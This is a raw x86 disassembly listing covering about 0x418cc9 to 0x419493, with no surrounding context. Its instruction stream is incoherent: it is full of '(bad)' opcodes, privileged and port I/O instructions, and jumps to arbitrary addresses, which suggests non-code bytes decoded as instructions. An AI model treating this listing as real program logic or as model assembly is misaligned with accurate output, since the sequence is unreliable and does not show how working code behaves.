  418cc9:	stos   DWORD PTR es:[edi],eax
  418cca:	es into 
  418ccc:	add    BYTE PTR [bx+si],bl
  418ccf:	xchg   bl,dl
  418cd1:	rcl    esi,1
  418cd3:	jbe    0x418d1d
  418cd5:	jns    0x418d49
  418cd7:	cli    
  418cd8:	inc    eax
  418cd9:	and    eax,0xa5795f19
  418cde:	xor    al,0x9f
  418ce0:	jnp    0x418c8d
  418ce2:	cld    
  418ce3:	test   al,0x59
  418ce5:	adc    al,0xab
  418ce7:	pop    ss
  418ce8:	(bad)  [ecx-0x7b]
  418ceb:	jmp    0x114915e0
  418cf0:	or     dh,bh
  418cf2:	int    0x7d
  418cf4:	xor    BYTE PTR [edx],ch
  418cf6:	jmp    0xd892ab71
  418cfb:	sahf   
  418cfc:	scas   eax,DWORD PTR es:[edi]
  418cfd:	int    0x12
  418cff:	push   es
  418d00:	lods   al,BYTE PTR ds:[esi]
  418d01:	jne    0x418d01
  418d03:	pop    eax
  418d04:	inc    edx
  418d05:	jbe    0x418d58
  418d07:	xchg   edx,eax
  418d08:	mov    dh,0xa9
  418d0a:	inc    eax
  418d0b:	clc    
  418d0c:	or     eax,0xcf1b8887
  418d11:	xchg   esp,edi
  418d13:	cmp    bh,BYTE PTR [ebx+0x2b]
  418d16:	jl     0x418d5a
  418d18:	fwait
  418d19:	outs   dx,DWORD PTR ds:[esi]
  418d1a:	add    BYTE PTR ds:0xaabb809a,bh
  418d20:	mov    al,ds:0x8dff6863
  418d25:	stc    
  418d26:	or     al,0x15
  418d28:	cs retf 
  418d2a:	lds    edx,FWORD PTR [ebx-0x57]
  418d2d:	bnd jb 0x418cd4
  418d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d32:	aas    
  418d33:	test   al,0x30
  418d35:	jmp    0xe7d32770
  418d3a:	sbb    DWORD PTR [ebp+0x37],ebp
  418d3d:	mov    edi,0x9f44b3ef
  418d42:	inc    eax
  418d43:	pop    esp
  418d44:	mov    bh,0x45
  418d46:	idiv   BYTE PTR [eax]
  418d48:	sbb    edi,DWORD PTR [eax-0x3d]
  418d4b:	xor    BYTE PTR [ecx-0x63071975],dl
  418d51:	inc    esi
  418d52:	mov    cl,0xec
  418d54:	fcmove st,st(0)
  418d56:	pop    es
  418d57:	jg     0x418da0
  418d59:	pop    es
  418d5a:	repz xor al,0xea
  418d5d:	scas   al,BYTE PTR es:[edi]
  418d5e:	sbb    ebp,eax
  418d60:	inc    edi
  418d61:	xchg   ecx,eax
  418d62:	and    dl,bl
  418d64:	xchg   ebp,eax
  418d65:	fldln2 
  418d67:	dec    edi
  418d68:	popa   
  418d69:	mov    edx,0xe38d115c
  418d6e:	(bad)  
  418d6f:	es jmp 0xf2a80436
  418d75:	clc    
  418d76:	std    
  418d77:	sar    BYTE PTR [edi],cl
  418d79:	push   esi
  418d7a:	pop    esi
  418d7b:	cmp    eax,0x7e23e2a1
  418d80:	jp     0x418d8c
  418d82:	hlt    
  418d83:	iret   
  418d84:	or     eax,0x49173abc
  418d89:	fld    DWORD PTR [ebx+0x6e]
  418d8c:	jp     0x418e05
  418d8e:	push   edx
  418d8f:	mov    esi,0x496013f5
  418d94:	pop    es
  418d95:	jmp    0x418d60
  418d97:	ins    DWORD PTR es:[edi],dx
  418d98:	sbb    al,0xdb
  418d9a:	iret   
  418d9b:	sub    BYTE PTR [ecx-0x74b89cdc],0xe5
  418da2:	jno    0x418d35
  418da4:	xor    cl,BYTE PTR [edi-0x3de5298c]
  418daa:	gs sub eax,0x3207d48a
  418db0:	imul   ebp
  418db2:	jge    0x418e2e
  418db4:	sahf   
  418db5:	mov    edx,0xf60b0d63
  418dba:	std    
  418dbb:	ja     0x418e20
  418dbd:	xchg   ecx,eax
  418dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbf:	xchg   esp,eax
  418dc0:	adc    bh,BYTE PTR [esi+0x664c1082]
  418dc6:	mov    ebp,DWORD PTR [ecx+esi*4+0x1c918919]
  418dcd:	inc    esp
  418dce:	std    
  418dcf:	push   ebx
  418dd0:	cdq    
  418dd1:	ins    DWORD PTR es:[edi],dx
  418dd2:	nop
  418dd3:	pop    esp
  418dd4:	stos   DWORD PTR es:[edi],eax
  418dd5:	pop    ecx
  418dd6:	into   
  418dd7:	aam    0x67
  418dd9:	pop    eax
  418dda:	ins    DWORD PTR es:[edi],dx
  418ddb:	hlt    
  418ddc:	mov    ch,0xda
  418dde:	hlt    
  418ddf:	sbb    DWORD PTR ds:0xa539ff5b,eax
  418de5:	js     0x418d7c
  418de7:	jne    0x418d8d
  418de9:	dec    edx
  418dea:	and    al,0xbe
  418dec:	xor    eax,DWORD PTR [ecx+0x58]
  418def:	loope  0x418e31
  418df1:	dec    esi
  418df2:	adc    BYTE PTR [esi+0x71],dh
  418df5:	in     al,0x8e
  418df7:	arpl   cx,cx
  418df9:	mov    ebp,0xbc337cfa
  418dfe:	shl    DWORD PTR cs:[esi+esi*2],1
  418e02:	mov    edx,0xc9317843
  418e07:	mov    DWORD PTR [ebx-0x47ab39e4],esp
  418e0d:	jnp    0x418e72
  418e0f:	sbb    BYTE PTR [eax],0x36
  418e12:	rcr    DWORD PTR [ebx],cl
  418e14:	cmc    
  418e15:	clc    
  418e16:	xchg   edx,eax
  418e17:	xchg   edx,eax
  418e18:	xchg   esp,eax
  418e19:	imul   esp,DWORD PTR [ecx+0x22137606],0x65
  418e20:	test   BYTE PTR [eax],dh
  418e22:	cmp    eax,0x2212f9f
  418e27:	lock pmulhuw mm0,QWORD PTR [edi-0x4d]
  418e2c:	(bad)  
  418e2d:	jns    0x418e17
  418e2f:	add    ah,BYTE PTR [ecx-0x69b9e8cf]
  418e35:	mov    edi,0xeb02bc4e
  418e3a:	lock mov dh,0x96
  418e3d:	and    al,0xf
  418e3f:	jne    0x418e92
  418e41:	and    BYTE PTR [esi-0x36270fb9],ah
  418e47:	inc    eax
  418e48:	push   es
  418e49:	sbb    al,0xd1
  418e4b:	adc    DWORD PTR [ebp+0x679a59c2],ebx
  418e51:	push   DWORD PTR [ebp-0x4d]
  418e54:	jmp    DWORD PTR [eax-0x4d]
  418e57:	bound  ebp,QWORD PTR [edx+0x54f63bc5]
  418e5d:	sub    DWORD PTR [ebx],edx
  418e5f:	fdiv   QWORD PTR [edi]
  418e61:	jb     0x418e7a
  418e63:	mov    edi,0x330a710
  418e68:	or     eax,0xeea72d76
  418e6d:	mov    edi,0xfcd3fce9
  418e72:	ins    BYTE PTR es:[edi],dx
  418e73:	repz sbb esp,ebp
  418e76:	jmp    0x418ef6
  418e78:	xchg   ecx,eax
  418e79:	mov    BYTE PTR [ebp+0x2d],ah
  418e7c:	and    bh,BYTE PTR [ebx-0x7a]
  418e7f:	sub    eax,DWORD PTR [ebx]
  418e81:	jge    0x418efb
  418e83:	xchg   esi,eax
  418e84:	sbb    esi,eax
  418e86:	push   esi
  418e87:	adc    BYTE PTR ds:0x612a6a5b,al
  418e8d:	push   cs
  418e8e:	addr16 push edi
  418e90:	cmp    BYTE PTR [edi+0x6ea331c6],cl
  418e96:	out    0x47,eax
  418e98:	outs   dx,BYTE PTR ds:[esi]
  418e99:	lahf   
  418e9a:	mov    dl,0xab
  418e9c:	inc    edx
  418e9d:	popa   
  418e9e:	loopne 0x418e82
  418ea0:	adc    eax,0xbd5c380d
  418ea5:	call   0x7367:0xbcbb5a89
  418eac:	xor    eax,0x869714fc
  418eb1:	(bad)  
  418eb3:	jns    0x418f06
  418eb5:	fild   DWORD PTR [eax-0x55]
  418eb8:	push   esp
  418eb9:	cmp    ah,BYTE PTR [ecx+0x75]
  418ebc:	icebp  
  418ebd:	pop    ds
  418ebe:	ins    BYTE PTR es:[edi],dx
  418ebf:	mov    edi,0xbf585cce
  418ec4:	inc    esp
  418ec5:	xor    dh,dl
  418ec7:	in     eax,0x41
  418ec9:	ins    DWORD PTR es:[edi],dx
  418eca:	xchg   edi,ebx
  418ecc:	push   es
  418ecd:	xchg   ebx,eax
  418ece:	aaa    
  418ecf:	int    0xb5
  418ed1:	xchg   ecx,eax
  418ed2:	mov    eax,0x1c1b0f14
  418ed7:	sub    edx,DWORD PTR ds:[eax]
  418eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418edb:	shl    BYTE PTR [eax+edx*2+0x5f3bf3bd],0x94
  418ee3:	sbb    al,0xf
  418ee5:	push   es
  418ee6:	push   edi
  418ee7:	adc    dl,cl
  418ee9:	mov    esp,0x6ad2eb32
  418eee:	xchg   ebx,eax
  418eef:	call   FWORD PTR [edi]
  418ef1:	lock cmp esi,DWORD PTR [edi]
  418ef4:	xlat   BYTE PTR ds:[ebx]
  418ef5:	dec    ebp
  418ef6:	cmp    BYTE PTR [esp+eax*1],bh
  418ef9:	sbb    al,0x13
  418efb:	gs out dx,al
  418efd:	jns    0x418ea6
  418eff:	xchg   esi,eax
  418f00:	loopne 0x418f14
  418f02:	(bad)  
  418f03:	xor    al,0xfe
  418f05:	adc    BYTE PTR [ecx+ecx*8],cl
  418f08:	and    dh,BYTE PTR [eax]
  418f0a:	icebp  
  418f0b:	daa    
  418f0c:	jecxz  0x418f34
  418f0e:	ficom  WORD PTR [esi]
  418f10:	out    0x0,al
  418f12:	jno    0x418ed8
  418f14:	sub    bh,0xd4
  418f17:	fcmovnu st,st(4)
  418f19:	sub    al,0xb0
  418f1b:	or     eax,DWORD PTR [eax+0x35e5e5e4]
  418f21:	push   esp
  418f22:	adc    eax,0xed6364a5
  418f27:	out    0x23,al
  418f29:	(bad)  
  418f2a:	fstp   DWORD PTR [esi-0x4eb4e494]
  418f30:	fstp   TBYTE PTR ds:0x5478c92
  418f36:	fchs   
  418f38:	mov    ebp,0xcae3ac01
  418f3d:	cld    
  418f3e:	xchg   edx,eax
  418f3f:	retf   
  418f40:	repnz dec ebx
  418f42:	mov    ebp,0xfa0cb72d
  418f47:	push   ds
  418f48:	pop    ds
  418f49:	xchg   esi,eax
  418f4a:	ss dec ebx
  418f4c:	mov    cl,0x8b
  418f4e:	xor    DWORD PTR [edi],ebx
  418f50:	ret    0x7f4
  418f53:	mov    WORD PTR [ebp+0x79],ss
  418f56:	iret   
  418f57:	test   BYTE PTR [ebx+0x6d79acab],0x58
  418f5e:	push   ebp
  418f5f:	ins    DWORD PTR es:[edi],dx
  418f60:	mov    ds:0xa8617aa1,al
  418f65:	xchg   ebp,eax
  418f66:	out    0xba,eax
  418f68:	call   0x5d75c875
  418f6d:	push   ebp
  418f6e:	idiv   BYTE PTR [ebp+0x51]
  418f71:	out    dx,eax
  418f72:	fwait
  418f73:	dec    esi
  418f74:	shr    BYTE PTR [esi-0x1e],1
  418f77:	test   DWORD PTR [ecx-0x7d881ff4],0x4c8418fd
  418f81:	xchg   BYTE PTR [ebx-0x15],dl
  418f84:	test   DWORD PTR [eax],ebx
  418f86:	sub    BYTE PTR [ecx+0x6e0ba499],bl
  418f8c:	pusha  
  418f8d:	dec    ebx
  418f8e:	iret   
  418f8f:	pop    es
  418f90:	inc    ebp
  418f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f92:	fmul   QWORD PTR [ecx-0x16]
  418f95:	bound  esp,QWORD PTR [esi]
  418f97:	call   0xcb3c:0x2f90ed61
  418f9e:	pop    esp
  418f9f:	out    0x4c,al
  418fa1:	xor    BYTE PTR [esp+eiz*8],ah
  418fa4:	out    dx,eax
  418fa5:	test   DWORD PTR [esi+ecx*2+0x0],eax
  418fa9:	jp     0x418f69
  418fab:	mov    edi,0xa3e4b091
  418fb0:	add    DWORD PTR [esi+0x2cc86d3e],0xb4ef8c68
  418fba:	std    
  418fbb:	fmul   QWORD PTR [ebx+0x6d515f28]
  418fc1:	cmc    
  418fc2:	push   ebp
  418fc3:	jp     0x418ff1
  418fc5:	(bad)  
  418fc7:	scas   eax,DWORD PTR es:[edi]
  418fc8:	xchg   ebp,eax
  418fc9:	pmaxub mm7,QWORD PTR [edx-0x77ff55f9]
  418fd0:	xchg   edi,eax
  418fd1:	jle    0x418f8a
  418fd3:	xchg   DWORD PTR [ebp+ebp*1+0x43acda57],ecx
  418fda:	or     DWORD PTR [ecx+0x788a491c],0x3fa802ca
  418fe4:	je     0x418fc7
  418fe6:	mov    ecx,0xbc19df58
  418feb:	ror    BYTE PTR ds:0xd069a0a5,0xe2
  418ff2:	push   es
  418ff3:	adc    edx,DWORD PTR [edi+0x41]
  418ff6:	fcomp  QWORD PTR ds:0x3567
  418ffb:	dec    edi
  418ffc:	ins    DWORD PTR es:[edi],dx
  418ffd:	jb     0x41907d
  418fff:	sbb    BYTE PTR [esi],bl
  419001:	std    
  419002:	mov    eax,ds:0xcfc73fdd
  419007:	add    DWORD PTR ds:0x78f4b3fa,ebp
  41900d:	dec    ebx
  41900e:	xchg   edi,eax
  41900f:	xor    al,0x76
  419011:	dec    ecx
  419012:	mov    ds:0x84e211bc,al
  419017:	icebp  
  419018:	fxam   
  41901a:	outs   dx,BYTE PTR ds:[esi]
  41901b:	mov    WORD PTR [ebx+0x50],ds
  41901e:	dec    esi
  41901f:	ds js  0x419057
  419022:	adc    edx,DWORD PTR [ecx+0x3edddf1f]
  419028:	out    dx,al
  419029:	mov    edi,0x5682efb1
  41902e:	in     al,dx
  41902f:	cmp    dh,al
  419031:	mov    al,0x95
  419033:	adc    esp,DWORD PTR [ebx]
  419035:	rcl    DWORD PTR [ebp+0x633a7229],1
  41903b:	add    al,0xd2
  41903d:	(bad)  
  41903e:	outs   dx,BYTE PTR ds:[esi]
  41903f:	xchg   edx,eax
  419040:	push   es
  419041:	sub    DWORD PTR [edx-0x6e],edi
  419044:	push   edi
  419045:	test   ecx,ebp
  419047:	int3   
  419048:	pop    edi
  419049:	mov    eax,ds:0xd81d9978
  41904e:	out    0xb8,eax
  419050:	xchg   ebx,eax
  419051:	cwde   
  419052:	fcom   QWORD PTR [edx+ebp*2-0x69]
  419056:	sbb    eax,0x7f4ef87
  41905b:	fucomi st,st(4)
  41905d:	(bad)  
  41905f:	out    dx,eax
  419060:	in     al,dx
  419061:	xor    DWORD PTR [esi-0x704105b2],ebx
  419067:	in     eax,0x8f
  419069:	sbb    esi,eax
  41906b:	outs   dx,DWORD PTR ds:[esi]
  41906c:	add    DWORD PTR [edi+0x5d842557],0x37
  419073:	xchg   edi,eax
  419074:	jb     0x419039
  419076:	sbb    DWORD PTR [edx+0x48],edi
  419079:	and    DWORD PTR [eax],0xfffffff8
  41907c:	pop    DWORD PTR [ecx-0x7ae5dbc2]
  419082:	jne    0x41902d
  419084:	jbe    0x41900d
  419086:	fnstsw WORD PTR [esi-0x17332984]
  41908c:	sub    al,0xcd
  41908e:	mov    cl,0x64
  419090:	mov    edi,DWORD PTR [ecx-0x10]
  419093:	mov    ecx,0xba8e0d95
  419098:	inc    esi
  419099:	sub    esp,esp
  41909b:	addr16 jge 0x41911a
  41909e:	fadd   QWORD PTR [ebx+ecx*4-0x55]
  4190a2:	adc    al,0x2c
  4190a4:	(bad)  [edi-0x49]
  4190a7:	ret    
  4190a8:	inc    edx
  4190a9:	sub    BYTE PTR cs:[ebp+0xca337a6],cl
  4190b0:	inc    esi
  4190b1:	rcl    bh,cl
  4190b3:	lock add dl,BYTE PTR ds:0xf2332928
  4190ba:	rol    esi,0x4e
  4190bd:	jle    0x419074
  4190bf:	mov    ecx,?
  4190c1:	xchg   esp,eax
  4190c2:	cdq    
  4190c3:	shl    BYTE PTR [esi-0x47],0x4e
  4190c7:	or     eax,DWORD PTR [edi+ebx*4]
  4190ca:	mov    ds:0xb874595e,eax
  4190cf:	pop    ebp
  4190d0:	inc    edx
  4190d1:	mov    ebp,0xe505053e
  4190d6:	or     dl,ch
  4190d8:	push   es
  4190d9:	cdq    
  4190da:	jmp    0xa90fa6be
  4190df:	sahf   
  4190e0:	jge    0x419074
  4190e2:	add    BYTE PTR [esi+0x19a93b3b],cl
  4190e8:	hlt    
  4190e9:	pop    ebp
  4190ea:	jge    0x41906e
  4190ec:	pop    eax
  4190ed:	dec    eax
  4190ee:	sbb    eax,0x6b74407e
  4190f3:	push   0x78
  4190f5:	aad    0x4c
  4190f7:	xchg   ebx,eax
  4190f8:	in     eax,dx
  4190f9:	ret    0x8d0
  4190fc:	fsubr  DWORD PTR [edx-0x625218d4]
  419102:	aam    0xa5
  419104:	div    DWORD PTR ds:0xc17a088d
  41910a:	mov    esp,0xdcd79092
  41910f:	fidiv  DWORD PTR [ecx]
  419111:	jmp    0xb0:0x5646a527
  419118:	retf   
  419119:	repz ja 0x419160
  41911c:	aam    0x2b
  41911e:	mov    cl,dl
  419120:	(bad)  
  419121:	in     eax,dx
  419122:	daa    
  419123:	xchg   esp,eax
  419124:	ret    
  419125:	pushf  
  419126:	jle    0x4190b4
  419128:	cdq    
  419129:	fbld   TBYTE PTR [eax-0x52]
  41912c:	ds out 0x1f,eax
  41912f:	xlat   BYTE PTR ds:[ebx]
  419130:	push   esp
  419131:	sahf   
  419132:	pop    ds
  419133:	cdq    
  419134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419135:	dec    eax
  419136:	dec    edi
  419137:	in     eax,0xed
  419139:	xchg   edi,eax
  41913a:	pop    ss
  41913b:	addr16 aam 0x4e
  41913e:	stc    
  41913f:	add    edi,DWORD PTR [eax]
  419141:	push   esi
  419142:	push   edx
  419143:	push   cs
  419144:	xor    cl,BYTE PTR [ecx+eiz*8]
  419147:	pusha  
  419148:	xchg   ebx,eax
  419149:	fcom   QWORD PTR [ecx+0x7d]
  41914c:	push   edx
  41914d:	add    al,0x58
  41914f:	jg     0x419194
  419151:	add    BYTE PTR [esp+edx*2-0x2f],0xa5
  419156:	les    esi,FWORD PTR [edi+ecx*2+0x44]
  41915a:	cmc    
  41915b:	dec    BYTE PTR [eax+0x37df2b6d]
  419161:	xor    bl,ch
  419163:	push   esi
  419164:	inc    ebp
  419165:	or     bh,BYTE PTR [edx-0x30]
  419168:	out    0xe3,al
  41916a:	push   esp
  41916b:	xlat   BYTE PTR ds:[ebx]
  41916c:	ret    0xc21f
  41916f:	push   ebx
  419170:	sbb    ah,dh
  419172:	and    ebx,DWORD PTR [edx+0x77c17b29]
  419178:	push   0xfffffff2
  41917a:	push   ebp
  41917b:	sti    
  41917c:	out    0x10,al
  41917e:	lock mov al,0x26
  419181:	loop   0x41917a
  419183:	inc    edi
  419184:	clc    
  419185:	jns    0x419185
  419187:	les    eax,FWORD PTR [eax-0x2c]
  41918a:	dec    ebx
  41918b:	xchg   esi,eax
  41918c:	mov    ebx,eax
  41918e:	ins    BYTE PTR es:[edi],dx
  41918f:	(bad)  
  419190:	aas    
  419191:	cmp    ebp,DWORD PTR [esi]
  419193:	xor    ebx,ebp
  419195:	sub    ah,bl
  419197:	imul   ecx,DWORD PTR ds:0x29009cb6,0xe4a009f0
  4191a1:	cmp    BYTE PTR [ebx],bl
  4191a3:	idiv   DWORD PTR [edi-0x4dec52de]
  4191a9:	inc    edx
  4191aa:	push   ebp
  4191ab:	and    BYTE PTR [ebx],ah
  4191ad:	cmp    eax,0xb0072803
  4191b2:	push   ds
  4191b3:	push   esp
  4191b4:	jno    0x4191e1
  4191b6:	mov    al,0x7e
  4191b8:	in     eax,dx
  4191b9:	pusha  
  4191ba:	jnp    0x4191a2
  4191bc:	cli    
  4191bd:	retf   0x52e4
  4191c0:	inc    esp
  4191c1:	outs   dx,BYTE PTR ds:[esi]
  4191c2:	lahf   
  4191c3:	add    bh,dh
  4191c5:	and    bl,BYTE PTR [esi-0x2c]
  4191c8:	jecxz  0x4191ec
  4191ca:	and    bh,BYTE PTR [edi+0x52d70a3a]
  4191d0:	lock outs dx,DWORD PTR ds:[esi]
  4191d2:	sbb    al,0x27
  4191d4:	inc    ebx
  4191d5:	jmp    0x4191ee
  4191d7:	sbb    DWORD PTR [esi],edi
  4191d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191da:	retf   0xbfa7
  4191dd:	sbb    eax,0x167e9dac
  4191e2:	push   ebp
  4191e3:	int    0xac
  4191e5:	stc    
  4191e6:	jecxz  0x419256
  4191e8:	retf   0xbe8e
  4191eb:	ret    0x97da
  4191ee:	push   cs
  4191ef:	hlt    
  4191f0:	xor    DWORD PTR [eax-0x281a4dfd],esi
  4191f6:	jp     0x419225
  4191f8:	mov    esp,0x62598f3c
  4191fd:	(bad)  
  4191fe:	sbb    BYTE PTR [ebx+0x2843c544],bl
  419204:	mov    bh,0xca
  419206:	rcl    DWORD PTR [eax+0x7e0e45f7],1
  41920c:	push   edx
  41920d:	push   esi
  41920e:	inc    esi
  41920f:	repnz dec edx
  419211:	and    bl,BYTE PTR [edi]
  419213:	mov    dl,0x57
  419215:	stos   DWORD PTR es:[edi],eax
  419216:	add    esi,DWORD PTR [edi]
  419218:	test   eax,0x19e07baf
  41921d:	add    al,0x55
  41921f:	sbb    BYTE PTR [ebx+0x1e],cl
  419222:	or     ch,dh
  419224:	xor    edi,DWORD PTR [ebp+0x1a]
  419227:	(bad)  
  419228:	cdq    
  419229:	(bad)  [ecx+0xa4d3f64]
  41922f:	iret   
  419230:	mov    ch,0xbb
  419232:	inc    edx
  419233:	je     0x4191c7
  419235:	cmp    eax,0xbabcf613
  41923a:	mov    dh,0xa3
  41923c:	or     eax,DWORD PTR [eax-0x15d151ea]
  419242:	push   0x3a171813
  419247:	aas    
  419248:	retf   
  419249:	cmp    dl,BYTE PTR [ebx-0x7ec16053]
  41924f:	lea    esi,[edx+0x12]
  419252:	sbb    DWORD PTR [edx+0x47],eax
  419255:	test   DWORD PTR [edx+0x44],ebx
  419258:	jns    0x4191e6
  41925a:	and    ch,BYTE PTR [ecx+0x48]
  41925d:	jno    0x419213
  41925f:	leave  
  419260:	sbb    ecx,DWORD PTR [esi-0x1]
  419263:	lock (bad) 
  419266:	sbb    al,0x85
  419268:	jecxz  0x419244
  41926a:	dec    ecx
  41926b:	data16 sahf 
  41926d:	in     eax,dx
  41926e:	dec    eax
  41926f:	sub    al,ch
  419271:	mov    ecx,ds
  419273:	fiadd  WORD PTR [ebp-0x38]
  419276:	cmp    al,BYTE PTR [edi]
  419278:	mov    edx,0x781f234f
  41927d:	and    BYTE PTR [ecx],bl
  41927f:	pop    esp
  419280:	frstor ds:0xb7d5d18a
  419286:	fiadd  WORD PTR [esi+esi*2-0x48]
  41928a:	cmp    eax,0xbaed5884
  41928f:	sub    esi,DWORD PTR [ebx+eiz*8-0x72212392]
  419296:	imul   ebp,DWORD PTR [edx+0x62fe227c],0xd8645b6f
  4192a0:	push   0xfffffff8
  4192a2:	ds pop eax
  4192a4:	mov    eax,ds:0x5342592e
  4192a9:	lea    ebp,[esi]
  4192ab:	fcmovne st,st(1)
  4192ad:	mov    ds:0xd46b2edd,al
  4192b2:	or     ecx,edi
  4192b4:	es push edi
  4192b6:	sbb    BYTE PTR ds:0x5a61829b,al
  4192bc:	mov    BYTE PTR [ecx+0x2492da45],dh
  4192c2:	repnz dec ecx
  4192c4:	shr    BYTE PTR [ecx],0xeb
  4192c7:	sub    DWORD PTR ds:0xbf621e23,edi
  4192cd:	push   esp
  4192ce:	lds    esi,FWORD PTR [edi]
  4192d0:	xor    bl,cl
  4192d2:	mov    ecx,0xa51d084d
  4192d7:	adc    DWORD PTR [ecx+0x47e2ef41],ecx
  4192dd:	out    dx,eax
  4192de:	pop    edx
  4192df:	sbb    al,0xec
  4192e1:	pop    eax
  4192e2:	sub    BYTE PTR [edx],bl
  4192e4:	add    esi,edi
  4192e6:	in     al,dx
  4192e7:	push   cs
  4192e8:	ins    BYTE PTR es:[edi],dx
  4192e9:	sar    BYTE PTR [ecx+0xdc710d4],1
  4192ef:	push   es
  4192f0:	or     BYTE PTR [ebx],bh
  4192f2:	mov    ch,0xa
  4192f4:	xchg   BYTE PTR [ebx],cl
  4192f6:	xchg   edi,eax
  4192f7:	mov    ss,WORD PTR [edi+0xe2c8d64]
  4192fd:	jne    0x419356
  4192ff:	jo     0x41934c
  419301:	sbb    al,0x34
  419303:	pop    esi
  419304:	mov    eax,0xc7bb669c
  419309:	cmp    esi,DWORD PTR [ebx]
  41930b:	push   ebx
  41930c:	nop
  41930d:	cli    
  41930e:	push   ss
  41930f:	add    eax,0xc2e47e50
  419314:	retf   0xef35
  419317:	(bad)  
  419318:	mov    edx,0x9a7586b9
  41931d:	mov    esp,ss
  41931f:	shl    DWORD PTR [ecx-0x4864e2a7],cl
  419325:	into   
  419326:	cmp    ecx,DWORD PTR ds:0xee7a6447
  41932c:	mov    al,ds:0xbca2c75c
  419331:	pop    ebp
  419332:	int3   
  419333:	outs   dx,BYTE PTR ss:[esi]
  419335:	pop    ss
  419336:	popf   
  419337:	aam    0x1a
  419339:	iret   
  41933a:	mov    al,0x57
  41933c:	call   0xc50431b0
  419341:	sub    al,0x79
  419343:	jns    0x4193a5
  419345:	js     0x419320
  419347:	xchg   esp,eax
  419348:	sub    BYTE PTR [ebx+ecx*4-0x4a686d22],dl
  41934f:	xor    cl,dh
  419351:	call   0x2132:0x42c2eb1d
  419358:	inc    esi
  419359:	jp     0x419388
  41935b:	jb     0x419302
  41935d:	or     DWORD PTR [ebp-0x4d88f596],ecx
  419363:	xchg   esi,eax
  419364:	xor    DWORD PTR [edi-0x5b6e25c9],esp
  41936a:	jmp    0xea0f:0x87d825de
  419371:	stos   BYTE PTR es:[edi],al
  419372:	mov    edx,0x7e9b154b
  419377:	mov    bl,0xf2
  419379:	sub    BYTE PTR [ebx],ah
  41937b:	ret    0xf59a
  41937e:	xor    esp,DWORD PTR [ecx+0x71]
  419381:	xchg   edi,eax
  419382:	push   cs
  419383:	mov    BYTE PTR [eax-0x7],al
  419386:	adc    cl,BYTE PTR [ecx+0x38]
  419389:	icebp  
  41938a:	fbld   TBYTE PTR [ebp-0x7e]
  41938d:	fiadd  WORD PTR [ebx+ecx*8]
  419390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419391:	sbb    DWORD PTR [edx-0x36],esp
  419394:	cwde   
  419395:	call   0xfc2100d5
  41939a:	pop    ecx
  41939b:	sbb    al,0xbd
  41939d:	out    dx,al
  41939e:	mov    dh,0x4
  4193a0:	xchg   edi,eax
  4193a1:	jb     0x419361
  4193a3:	mov    bl,0xf0
  4193a5:	repz scas al,BYTE PTR es:[edi]
  4193a7:	jmp    0x419396
  4193a9:	xlat   BYTE PTR ds:[ebx]
  4193aa:	sub    DWORD PTR [ebx-0x174e8f75],eax
  4193b0:	xlat   BYTE PTR ds:[ebx]
  4193b1:	fsub   st(1),st
  4193b3:	push   0x9e57c274
  4193b8:	dec    ebp
  4193b9:	sbb    eax,DWORD PTR [ebx+0x401f834d]
  4193bf:	add    DWORD PTR [eax-0xb5b02c0],ebx
  4193c5:	jl     0x41941d
  4193c7:	out    dx,al
  4193c8:	fsub   st(2),st
  4193ca:	aam    0xac
  4193cc:	and    eax,0xf8628523
  4193d1:	push   esi
  4193d2:	push   ds
  4193d3:	sub    DWORD PTR [eax],esi
  4193d5:	out    dx,eax
  4193d6:	lea    ebp,[esi+0x4a]
  4193d9:	int    0x35
  4193db:	sbb    cl,BYTE PTR [esi]
  4193dd:	nop
  4193de:	mov    al,ds:0xe3ed6650
  4193e3:	call   0x45891782
  4193e8:	jg     0x4193ec
  4193ea:	ins    BYTE PTR es:[edi],dx
  4193eb:	jge    0x4193aa
  4193ed:	clc    
  4193ee:	sub    DWORD PTR [edi-0x33],ebp
  4193f1:	pop    ebx
  4193f2:	jl     0x419473
  4193f4:	adc    eax,0x5a74fec3
  4193f9:	repz into 
  4193fb:	mov    edi,0x892706a8
  419400:	int3   
  419401:	addr16 mov eax,ds:0xb772
  419405:	jno    0x419459
  419407:	or     eax,0x6a48a5f7
  41940c:	push   ebx
  41940d:	imul   edi,DWORD PTR [edi],0x67a3828f
  419413:	mov    edi,0x41d9b266
  419418:	je     0x419444
  41941a:	adc    ecx,DWORD PTR [esi-0x7ae88437]
  419420:	aam    0x37
  419422:	scas   al,BYTE PTR es:[edi]
  419423:	enter  0x437c,0x8b
  419427:	xor    BYTE PTR [ebx-0x356ec4ba],bl
  41942d:	or     ebp,ebx
  41942f:	jno    0x419421
  419431:	das    
  419432:	jmp    0x41943b
  419434:	scas   eax,DWORD PTR es:[edi]
  419435:	and    eax,0xc3785471
  41943a:	sbb    eax,ebp
  41943c:	push   esi
  41943d:	pusha  
  41943e:	repnz stos BYTE PTR es:[edi],al
  419440:	inc    esp
  419441:	cmp    al,0xa2
  419443:	xchg   ebx,eax
  419444:	mov    ah,0x66
  419446:	cmp    dl,BYTE PTR [edx-0x10db9e64]
  41944c:	pop    es
  41944d:	cs jo  0x4193eb
  419450:	stos   DWORD PTR es:[edi],eax
  419451:	cdq    
  419452:	repnz mov DWORD PTR [ecx-0x1b],ebp
  419456:	fnstenv [ecx]
  419458:	jno    0x41944c
  41945a:	js     0x419426
  41945c:	ja     0x41946d
  41945e:	mov    al,ds:0x952f4166
  419463:	mov    cl,dl
  419465:	fistp  DWORD PTR [edi-0x582f2daf]
  41946b:	ins    BYTE PTR es:[edi],dx
  41946c:	jnp    0x4193f8
  41946e:	xor    ebx,esp
  419470:	xor    ah,BYTE PTR [eax-0xf]
  419473:	stos   BYTE PTR es:[edi],al
  419474:	sbb    BYTE PTR [ebx],bh
  419476:	mov    ebp,gs
  419478:	imul   ebp,esp,0x603ab96c
  41947e:	and    BYTE PTR [eax-0x12],dh
  419481:	adc    eax,0x2782497
  419486:	rcr    DWORD PTR [esp+edx*1],1
  419489:	mov    eax,0x41d097f5
  41948e:	mov    edx,0x2dddfee5
  419493:	sub    BYTE PTR ss:[ebx+0x21d5bde3],dl
